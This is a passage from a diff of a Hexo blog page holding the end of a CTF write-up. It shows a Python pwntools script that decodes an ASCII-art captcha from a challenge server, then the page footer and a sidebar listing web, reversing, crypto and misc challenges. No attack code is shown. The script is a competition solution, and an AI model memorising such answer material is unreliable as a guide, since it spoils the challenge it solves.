&quot;v&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo oooo    ooo`88. `88.  .8&apos;`88..]88..8&apos;`888&apos;`888&apos;`8&apos;  `8&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;w&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo    ooo`88b..8P&apos;Y888&apos;.o8&quot;&apos;88bo88&apos;   888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;x&quot;</span><br><span class="line">    if &quot;oooo    ooo`88.  .8&apos;`88..8&apos;`888&apos;.8&apos;.o..P&apos;`Y8P&apos;&quot; in i:</span><br><span class="line">        return &quot;y&quot;</span><br><span class="line">    if &apos;&apos;&apos;ooooooood&apos;&quot;&quot;7d8P.d8P&apos;.d8P&apos;  .Pd8888888P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;z&quot;</span><br><span class="line">        </span><br><span class="line">def input(lines):</span><br><span class="line">    char1 = []</span><br><span class="line">    char2 = []</span><br><span class="line">    char3 = []</span><br><span class="line">    char4 = []</span><br><span class="line">    char5 = []</span><br><span class="line">    char6 = []</span><br><span class="line">    for line in lines:</span><br><span class="line">        char1.append(line[:18])</span><br><span class="line">        char2.append(line[18:36])</span><br><span class="line">        char3.append(line[36:54])</span><br><span class="line">        char4.append(line[54:72])</span><br><span class="line">        char5.append(line[72:90])</span><br><span class="line">        char6.append(line[90:108])</span><br><span class="line"></span><br><span class="line">    ans = &quot;&quot;</span><br><span class="line">    ans += check(char1)</span><br><span class="line">    ans += check(char2)</span><br><span class="line">    ans += check(char3)</span><br><span class="line">    ans += check(char4)</span><br><span class="line">    ans += check(char5)</span><br><span class="line">    ans += check(char6)</span><br><span class="line">    sh.recvuntil(&quot;captcha: &quot;)</span><br><span class="line">    sh.sendline(ans)</span><br><span class="line"></span><br><span class="line">#print lines</span><br><span class="line">input(lines)</span><br><span class="line">for i in range(20):</span><br><span class="line">    data = sh.recvuntil(&quot;your &quot;)</span><br><span class="line">    lines = data.split(&quot;\n&quot;)[:-1]</span><br><span class="line">    input(lines)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/13/2018-hctf/" rel="next" title="2018-hctf-wp">
+                <i class="fa fa-chevron-left"></i> 2018-hctf-wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/18/湖湘杯/" rel="prev" title="湖湘杯部分题目wp">
+                湖湘杯部分题目wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleBlog"><span class="nav-number">1.1.</span> <span class="nav-text">SimpleBlog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleServerInjection"><span class="nav-number">1.2.</span> <span class="nav-text">SimpleServerInjection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleExtensionExplorerInjection"><span class="nav-number">1.3.</span> <span class="nav-text">SimpleExtensionExplorerInjection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimplePrintEventLogger"><span class="nav-number">1.4.</span> <span class="nav-text">SimplePrintEventLogger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleBBS"><span class="nav-number">1.5.</span> <span class="nav-text">SimpleBBS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RE-队友解出"><span class="nav-number">2.</span> <span class="nav-text">RE(队友解出)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re1"><span class="nav-number">2.1.</span> <span class="nav-text">re1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tailbone"><span class="nav-number">2.2.</span> <span class="nav-text">Tailbone</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto-队友解出"><span class="nav-number">3.</span> <span class="nav-text">crypto(队友解出)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AzureRSA"><span class="nav-number">3.1.</span> <span class="nav-text">AzureRSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GOGOGO"><span class="nav-number">4.1.</span> <span class="nav-text">GOGOGO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Checkin"><span class="nav-number">4.2.</span> <span class="nav-text">Checkin</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
